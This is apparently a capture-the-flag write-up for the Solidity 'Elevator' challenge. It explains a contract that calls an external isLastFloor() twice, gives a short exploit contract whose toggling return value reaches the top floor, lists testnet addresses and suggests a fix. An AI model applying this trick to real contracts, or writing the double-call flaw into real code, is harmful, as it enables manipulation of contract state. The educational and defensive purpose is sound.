# Elevator Challenge

## Objectives

1. Get to the top of the building (manage to have top = True)

## Challenge: Claiming Ownership

The chaalenge in this smart contract is this block:

```solidity
        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
```

We don't enter this code block only if we are not in the last floor (`isLastFloor(floor) = False`) and then we assign top to the resulting value of `isLastFloor(floor)`

## Implementation

The only way to get `top = True` is to have a toggling value returned by `isLastFloor()`, which can be implemented as follows:

```solidity
    bool public lastFloorCalled;

    function isLastFloor(uint256 floor) public returns (bool) {
        lastFloorCalled = !lastFloorCalled;
        return !lastFloorCalled;
    }
```

## Deployment

**Elevator Contract on Sepolia:** `0xE890254750087b8a3724b014A27340d7184EF296`

**Building Exploit contract on Sepolia:** `0x10a0bDC6468EA56D06F92866686f32505A564486`

## How to Avoid

To have this contract fulfill its goal, which is to never let you get to the top of the building, we can call `isLastFloor()` __only once__ and save its value in the function, instead of calling it twice.
Solution implementation in `./ElevatorSolution.sol`.